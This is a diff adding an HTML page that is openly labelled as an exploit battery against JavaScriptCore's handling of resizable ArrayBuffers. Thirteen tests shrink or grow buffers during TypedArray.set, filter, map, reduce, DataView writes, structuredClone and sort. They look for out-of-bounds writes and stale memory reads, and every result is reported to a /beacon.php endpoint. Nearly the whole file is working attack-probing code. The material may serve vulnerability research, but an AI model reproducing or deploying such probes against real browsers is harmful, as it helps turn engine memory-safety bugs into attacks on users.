@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P854</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P854: RAB TOCTOU + JSC Builtin Battery</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P854-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+bn('BOOT','start');
+log('RAB TOCTOU + JSC builtin exploit battery','info');
+log('Tests 13 operations for stale-length/OOB during RAB resize','info');
+log('','');
+
+/* Helper: fill RAB and return it */
+function makeRAB(sz,max){
+  var r=new ArrayBuffer(sz,{maxByteLength:max||sz*4});
+  var v=new Uint8Array(r);
+  for(var i=0;i<sz;i++)v[i]=(i&0xFF)||1;
+  return r;
+}
+
+/* ===== T1: TypedArray.set() with iterable that SHRINKS during yield ===== */
+log('--- T1: TA.set(iterable) + shrink during yield ---','hot');
+bn('T1-PRE','start');
+try{
+  var r1=makeRAB(1024,4096);
+  var ta1=new Uint8Array(r1);
+  var cnt1=0, threw1=false;
+  var iter1={
+    [Symbol.iterator]:function(){
+      var i=0;
+      return{next:function(){
+        if(i===10){try{r1.resize(8);}catch(e){}}
+        if(i>=100)return{done:true};
+        cnt1++;
+        return{done:false,value:i++};
+      }};
+    }
+  };
+  try{ta1.set(iter1);}catch(e){threw1=true;}
+  var s1='cnt='+cnt1+'|threw='+threw1+'|bl='+r1.byteLength+'|taLen='+ta1.length;
+  /* Check: were bytes written past resized length (8)? */
+  var v1=new Uint8Array(r1);
+  var past8=0;
+  for(var i=8;i<v1.length;i++)if(v1[i]!==0)past8++;
+  s1+='|past8nz='+past8;
+  log('  '+s1, past8>0?'hot':'info');
+  bn('T1',s1);
+}catch(e){log('  T1 ERR: '+e.message.slice(0,80),'fail');bn('T1','ERR|'+e.message.slice(0,200));}
+
+/* ===== T2: TA.set(iterable) that GROWS during yield ===== */
+log('','');
+log('--- T2: TA.set(iterable) + grow during yield ---','hot');
+bn('T2-PRE','start');
+try{
+  var r2=new ArrayBuffer(16,{maxByteLength:4096});
+  var ta2=new Uint8Array(r2);
+  var cnt2=0;
+  var iter2={
+    [Symbol.iterator]:function(){
+      var i=0;
+      return{next:function(){
+        if(i===5){try{r2.resize(4096);}catch(e){}}
+        if(i>=200)return{done:true};
+        cnt2++;
+        return{done:false,value:0xBB};
+      }};
+    }
+  };
+  var threw2=false;
+  try{ta2.set(iter2);}catch(e){threw2=true;}
+  var s2='cnt='+cnt2+'|threw='+threw2+'|bl='+r2.byteLength+'|taLen='+ta2.length;
+  /* Were bytes written past original 16? */
+  var v2=new Uint8Array(r2);
+  var past16=0;
+  for(var i=16;i<Math.min(v2.length,200);i++)if(v2[i]===0xBB)past16++;
+  s2+='|past16='+past16;
+  log('  '+s2, past16>0?'ok':'info');
+  bn('T2',s2);
+}catch(e){log('  T2 ERR: '+e.message.slice(0,80),'fail');bn('T2','ERR|'+e.message.slice(0,200));}
+
+/* ===== T3: Array.from(TA, mapFn) where mapFn resizes ===== */
+log('','');
+log('--- T3: Array.from(TA, mapFn) + shrink in mapFn ---','hot');
+bn('T3-PRE','start');
+try{
+  var r3=makeRAB(1024,4096);
+  var ta3=new Float64Array(r3);
+  for(var i=0;i<128;i++)ta3[i]=i+0.5;
+  var resized3=false;
+  var vals3=[];
+  var arr3=Array.from(ta3,function(v,i){
+    if(i===5&&!resized3){resized3=true;r3.resize(8);}
+    vals3.push(v);
+    return v;
+  });
+  var s3='arrLen='+arr3.length+'|valsLen='+vals3.length+'|resized='+resized3+'|bl='+r3.byteLength;
+  /* Check for NaN or stale values after resize */
+  var nan3=0,stale3=0;
+  for(var i=6;i<vals3.length;i++){
+    if(vals3[i]!==vals3[i])nan3++;
+    else if(vals3[i]!==undefined&&vals3[i]!==0)stale3++;
+  }
+  s3+='|nan='+nan3+'|stale='+stale3;
+  if(stale3>0)log('  *** STALE DATA after resize! ***','hot');
+  log('  '+s3, stale3>0?'hot':'info');
+  bn('T3',s3);
+}catch(e){log('  T3 ERR: '+e.message.slice(0,80),'fail');bn('T3','ERR|'+e.message.slice(0,200));}
+
+/* ===== T4: TA.filter() with callback that resizes ===== */
+log('','');
+log('--- T4: TA.filter(cb) + shrink in cb ---','hot');
+bn('T4-PRE','start');
+try{
+  var r4=makeRAB(2048,4096);
+  var ta4=new Uint32Array(r4);
+  for(var i=0;i<512;i++)ta4[i]=0xDEAD0000+i;
+  var resized4=false,readVals4=[];
+  var filtered4=Array.prototype.filter.call(ta4,function(v,i){
+    if(i===10&&!resized4){resized4=true;r4.resize(16);}
+    readVals4.push(v);
+    return v>0;
+  });
+  var s4='filtLen='+filtered4.length+'|read='+readVals4.length+'|resized='+resized4;
+  /* Stale reads = values from past-resize that aren't 0 or undefined */
+  var stale4=0;
+  for(var i=11;i<readVals4.length;i++){
+    if(readVals4[i]!==0&&readVals4[i]!==undefined)stale4++;
+  }
+  s4+='|stale='+stale4;
+  if(stale4>0){
+    log('  *** STALE VALUES in filter after resize! ***','hot');
+    var sample=readVals4.slice(11,16).map(function(v){return '0x'+(v>>>0).toString(16);});
+    log('  sample[11..15]: '+sample.join(', '),'hot');
+    s4+='|samp='+sample.join(',');
+  }
+  log('  '+s4, stale4>0?'hot':'info');
+  bn('T4',s4);
+}catch(e){log('  T4 ERR: '+e.message.slice(0,80),'fail');bn('T4','ERR|'+e.message.slice(0,200));}
+
+/* ===== T5: TA.map() with resize ===== */
+log('','');
+log('--- T5: TA.map(cb) + shrink in cb ---','hot');
+bn('T5-PRE','start');
+try{
+  var r5=makeRAB(1024,4096);
+  var ta5=new BigUint64Array(r5);
+  for(var i=0;i<128;i++)ta5[i]=BigInt(0xCAFE0000+i);
+  var resized5=false,mapped5=[];
+  var result5=Array.prototype.map.call(ta5,function(v,i){
+    if(i===5&&!resized5){resized5=true;r5.resize(8);}
+    mapped5.push(v);
+    return v;
+  });
+  var s5='mapLen='+result5.length+'|valsCnt='+mapped5.length+'|resized='+resized5;
+  var stale5=0;
+  for(var i=6;i<mapped5.length;i++){
+    if(mapped5[i]!==undefined&&mapped5[i]!==0n)stale5++;
+  }
+  s5+='|stale='+stale5;
+  if(stale5>0){
+    log('  *** STALE BigUint64 values! ***','hot');
+    var hex5=mapped5.slice(5,10).map(function(v){return v!==undefined?'0x'+v.toString(16):'undef';});
+    log('  vals[5..9]: '+hex5.join(', '),'hot');
+    s5+='|hex='+hex5.join(',');
+  }
+  log('  '+s5, stale5>0?'hot':'info');
+  bn('T5',s5);
+}catch(e){log('  T5 ERR: '+e.message.slice(0,80),'fail');bn('T5','ERR|'+e.message.slice(0,200));}
+
+/* ===== T6: TA.reduce() with resize ===== */
+log('','');
+log('--- T6: TA.reduce(cb) + shrink mid-reduce ---','hot');
+bn('T6-PRE','start');
+try{
+  var r6=makeRAB(512,4096);
+  var ta6=new Uint32Array(r6);
+  for(var i=0;i<128;i++)ta6[i]=1;
+  var resized6=false,callCnt6=0;
+  var sum6=Array.prototype.reduce.call(ta6,function(acc,v,i){
+    callCnt6++;
+    if(i===10&&!resized6){resized6=true;r6.resize(8);}
+    return acc+(v>>>0);
+  },0);
+  var s6='sum='+sum6+'|calls='+callCnt6+'|resized='+resized6+'|bl='+r6.byteLength;
+  log('  '+s6, callCnt6>12?'hot':'info');
+  bn('T6',s6);
+}catch(e){log('  T6 ERR: '+e.message.slice(0,80),'fail');bn('T6','ERR|'+e.message.slice(0,200));}
+
+/* ===== T7: TA.indexOf with valueOf that resizes ===== */
+log('','');
+log('--- T7: TA.indexOf(obj_with_valueOf) + resize ---','hot');
+bn('T7-PRE','start');
+try{
+  var r7=makeRAB(256,4096);
+  var ta7=new Float64Array(r7);
+  for(var i=0;i<32;i++)ta7[i]=i+0.5;
+  ta7[20]=42.0;
+  var resized7=false;
+  var evil7={valueOf:function(){
+    if(!resized7){resized7=true;r7.resize(8);}
+    return 42.0;
+  }};
+  var idx7=Array.prototype.indexOf.call(ta7,evil7);
+  var s7='idx='+idx7+'|resized='+resized7+'|bl='+r7.byteLength+'|taLen='+ta7.length;
+  log('  '+s7,'info');
+  bn('T7',s7);
+}catch(e){log('  T7 ERR: '+e.message.slice(0,80),'fail');bn('T7','ERR|'+e.message.slice(0,200));}
+
+/* ===== T8: DataView.setBigUint64 with valueOf that resizes ===== */
+log('','');
+log('--- T8: DataView.set with valueOf resize ---','hot');
+bn('T8-PRE','start');
+try{
+  var r8=makeRAB(256,4096);
+  var dv8=new DataView(r8);
+  var resized8=false;
+  var evilOff={valueOf:function(){
+    if(!resized8){resized8=true;r8.resize(8);}
+    return 200; /* Past resized length! */
+  }};
+  var threw8=false;
+  try{dv8.setUint32(evilOff,0xDEADBEEF,true);}catch(e){threw8=true;}
+  var s8='threw='+threw8+'|resized='+resized8+'|bl='+r8.byteLength;
+  /* Check if write landed at offset 200 (past logical length 8) */
+  r8.resize(256);
+  var check8=dv8.getUint32(200,true);
+  s8+='|val200=0x'+(check8>>>0).toString(16);
+  if(check8===0xDEADBEEF)log('  *** OOB WRITE via DataView! ***','hot');
+  log('  '+s8, check8===0xDEADBEEF?'hot':'info');
+  bn('T8',s8);
+}catch(e){log('  T8 ERR: '+e.message.slice(0,80),'fail');bn('T8','ERR|'+e.message.slice(0,200));}
+
+/* ===== T9: structuredClone with getter that resizes RAB ===== */
+log('','');
+log('--- T9: structuredClone + getter resize ---','hot');
+bn('T9-PRE','start');
+try{
+  var r9=makeRAB(4096,8192);
+  var v9=new Uint8Array(r9);
+  for(var i=0;i<4096;i++)v9[i]=0xCC;
+  var obj9={};
+  /* RAB first in enumeration order */
+  obj9.buf=r9;
+  /* Getter second — fires AFTER buf is (maybe) recorded */
+  Object.defineProperty(obj9,'trigger',{
+    get:function(){r9.resize(8);return 42;},
+    enumerable:true
+  });
+  var cloned9=structuredClone(obj9);
+  var s9='clonedBL='+cloned9.buf.byteLength+'|origBL='+r9.byteLength;
+  /* If cloned buf has 4096 bytes but original was resized to 8, check for stale data */
+  if(cloned9.buf.byteLength>8){
+    var cv9=new Uint8Array(cloned9.buf);
+    var cc9=0;
+    for(var i=0;i<Math.min(cv9.length,100);i++)if(cv9[i]===0xCC)cc9++;
+    s9+='|ccBytes='+cc9;
+    if(cc9>8)log('  *** Data from PRE-resize buffer in clone! ***','hot');
+  }
+  log('  '+s9,'info');
+  bn('T9',s9);
+}catch(e){log('  T9 ERR: '+e.message.slice(0,80),'fail');bn('T9','ERR|'+e.message.slice(0,200));}
+
+/* ===== T10: structuredClone with getter that resizes + transfer ===== */
+log('','');
+log('--- T10: structuredClone + getter + transfer ---','hot');
+bn('T10-PRE','start');
+try{
+  var r10=makeRAB(4096,8192);
+  var v10=new Uint8Array(r10);
+  for(var i=0;i<4096;i++)v10[i]=0xDD;
+  var obj10={};
+  Object.defineProperty(obj10,'trigger',{
+    get:function(){r10.resize(8);return 42;},
+    enumerable:true
+  });
+  obj10.buf=r10;
+  var cloned10=structuredClone(obj10,{transfer:[r10]});
+  var s10='clonedBL='+cloned10.buf.byteLength;
+  if(cloned10.buf.byteLength>8){
+    var cv10=new Uint8Array(cloned10.buf);
+    var dd10=0;
+    for(var i=0;i<Math.min(cv10.length,100);i++)if(cv10[i]===0xDD)dd10++;
+    s10+='|ddBytes='+dd10;
+  }
+  log('  '+s10,'info');
+  bn('T10',s10);
+}catch(e){log('  T10 ERR: '+e.message.slice(0,80),'fail');bn('T10','ERR|'+e.message.slice(0,200));}
+
+/* ===== T11: Array.sort comparator modifies array (classic JSC bug) ===== */
+log('','');
+log('--- T11: Array.sort comparator modifies array ---','hot');
+bn('T11-PRE','start');
+try{
+  var arr11=[];
+  for(var i=0;i<256;i++)arr11.push({val:i,toString:function(){return String(this.val);}});
+  var modified11=false;
+  arr11.sort(function(a,b){
+    if(!modified11&&a.val>100){
+      modified11=true;
+      /* Shrink array during sort */
+      arr11.length=10;
+      /* Then grow it back with different data */
+      for(var j=10;j<300;j++)arr11[j]={val:0xBEEF+j};
+    }
+    return (a?a.val:0)-(b?b.val:0);
+  });
+  var s11='len='+arr11.length+'|modified='+modified11;
+  /* Check for stale references or weird values */
+  var weird11=0;
+  for(var i=0;i<arr11.length;i++){
+    if(arr11[i]&&arr11[i].val>0xBEEF)weird11++;
+  }
+  s11+='|weird='+weird11;
+  log('  '+s11,'info');
+  bn('T11',s11);
+}catch(e){log('  T11 ERR: '+e.message.slice(0,80),'fail');bn('T11','ERR|'+e.message.slice(0,200));}
+
+/* ===== T12: JSON.parse reviver modifies result ===== */
+log('','');
+log('--- T12: JSON.parse reviver + array modification ---','hot');
+bn('T12-PRE','start');
+try{
+  var json12='{"a":[1,2,3,4,5,6,7,8,9,10],"b":"hello","c":42}';
+  var reviverFired12=0;
+  var result12=JSON.parse(json12,function(key,val){
+    reviverFired12++;
+    if(key==='a'&&Array.isArray(val)){
+      /* Mutate during reviver */
+      val.length=1000;
+      for(var j=10;j<100;j++)val[j]='INJECTED'+j;
+    }
+    return val;
+  });
+  var s12='fires='+reviverFired12+'|aLen='+result12.a.length;
+  var injected12=0;
+  for(var i=10;i<Math.min(result12.a.length,100);i++){
+    if(typeof result12.a[i]==='string'&&result12.a[i].indexOf('INJECTED')===0)injected12++;
+  }
+  s12+='|injected='+injected12;
+  log('  '+s12,'info');
+  bn('T12',s12);
+}catch(e){log('  T12 ERR: '+e.message.slice(0,80),'fail');bn('T12','ERR|'+e.message.slice(0,200));}
+
+/* ===== T13: TA.slice() on RAB after resize (stale length?) ===== */
+log('','');
+log('--- T13: TA.slice on RAB with stale cached length ---','hot');
+bn('T13-PRE','start');
+try{
+  var r13=makeRAB(2048,4096);
+  var ta13=new BigUint64Array(r13);
+  for(var i=0;i<256;i++)ta13[i]=BigInt(0xFACE0000+i);
+  /* Cache length in a variable */
+  var cachedLen=ta13.length; /* 256 */
+  /* Resize to shrink */
+  r13.resize(64);
+  /* ta13.length should update */
+  var liveLen=ta13.length;
+  /* Try to read using slice with old range */
+  var threw13=false, sliced13;
+  try{
+    sliced13=Array.prototype.slice.call(ta13,0,cachedLen);
+  }catch(e){threw13=true;}
+  var s13='cached='+cachedLen+'|live='+liveLen+'|threw='+threw13;
+  if(sliced13){
+    s13+='|sliceLen='+sliced13.length;
+    var nzPast=0;
+    for(var i=liveLen;i<sliced13.length;i++){
+      if(sliced13[i]!==undefined&&sliced13[i]!==0n)nzPast++;
+    }
+    s13+='|nzPast='+nzPast;
+    if(nzPast>0)log('  *** STALE DATA past resized length! ***','hot');
+  }
+  log('  '+s13, (sliced13&&sliced13.length>liveLen)?'hot':'info');
+  bn('T13',s13);
+}catch(e){log('  T13 ERR: '+e.message.slice(0,80),'fail');bn('T13','ERR|'+e.message.slice(0,200));}
+
+log('','');
+log('====== P854 COMPLETE ======','hot');
+bn('DONE','complete');
+</script></body></html>
